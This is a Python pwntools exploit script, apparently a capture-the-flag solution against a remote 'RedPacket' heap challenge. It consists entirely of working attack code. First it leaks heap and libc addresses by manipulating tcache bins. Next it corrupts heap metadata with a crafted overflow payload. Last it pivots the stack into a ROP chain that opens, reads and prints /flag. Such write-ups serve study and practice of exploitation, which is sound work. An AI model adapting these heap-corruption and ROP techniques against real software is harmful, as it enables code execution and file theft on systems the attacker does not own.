from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('RedPacket_SoEasyPwn1')
io = remote('node4.buuoj.cn', 26888)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so')
libc = ELF('libc-2.29.so')
elf = ELF('RedPacket_SoEasyPwn1')


def add(index, size, content):
    io.sendlineafter('Your input: ', '1')
    io.sendlineafter('Please input the red packet idx: ', str(index))
    io.sendlineafter('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ', str(size))
    io.sendafter('Please input content: ', content)


def delete(index):
    io.sendlineafter('Your input: ', '2')
    io.sendlineafter('Please input the red packet idx: ', str(index))


def edit(index, content):
    io.sendlineafter('Your input: ', '3')
    io.sendlineafter('Please input the red packet idx: ', str(index))
    io.sendafter('Please input content: ', content)


def show(index):
    io.sendlineafter('Your input: ', '4')
    io.sendlineafter('Please input the red packet idx: ', str(index))
    return io.recvline()[:-1]


def leak():
    global heap_base, libc_base
    for i in range(7):
        add(0, 4, '0x410')
        delete(0)
    add(1, 4, '0x410')
    for i in range(6):
        add(2, 2, '0x100')
        delete(2)
    delete(1)
    heap_base = u64(show(0).ljust(8, b'\x00')) - 0x26c0
    libc_base = u64(show(1).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x70
    log.success('heap_base: ' + hex(heap_base))
    log.success('libc_base: ' + hex(libc_base))
    
    
def pwn():
    add(3, 3, '0x310')      # unsorted_bin 0x100
    add(4, 4, '0x410')      # put it in smallbin
    add(5, 4, '0x410')      # avoid 4 in top_chunk
    delete(4)
    add(6, 3, '0x310')      # unsorted_bin 0x100
    add(7, 4, '0x410')      # put it in smallbin
    target = heap_base + 0x260 + 0x800
    payload = cyclic(0x300) + p64(0) + p64(0x101) + p64(heap_base + 0x31e0) + p64(target - 0x10)
    edit(4, payload)
    
    new_stack, buf = heap_base + 0x31f0, heap_base + 0x260
    pop_rdi_ret, pop_rdx_rsi_ret, leave_ret = libc_base + 0x26542, libc_base + 0x12bdc9, libc_base + 0x58373
    open, read, puts = libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['puts']
    ROPchain = b'/flag\x00\x00\x00'
    # open('/flag', 1, 0)
    ROPchain += p64(pop_rdi_ret) + p64(new_stack) + p64(pop_rdx_rsi_ret) + p64(0) + p64(0) + p64(open)
    # read(3, buf, 0x40)
    ROPchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rdx_rsi_ret) + p64(0x40) + p64(buf) + p64(read)
    # puts(buf)
    ROPchain += p64(pop_rdi_ret) + p64(buf) + p64(puts)
    add(8, 2, ROPchain)
     
    payload = cyclic(0x80) + p64(new_stack) + p64(leave_ret)
    io.sendlineafter('Your input: ', '666')
    io.sendafter('What do you want to say?', payload)
    io.recv()


if __name__ == '__main__':
    leak()
    pwn()
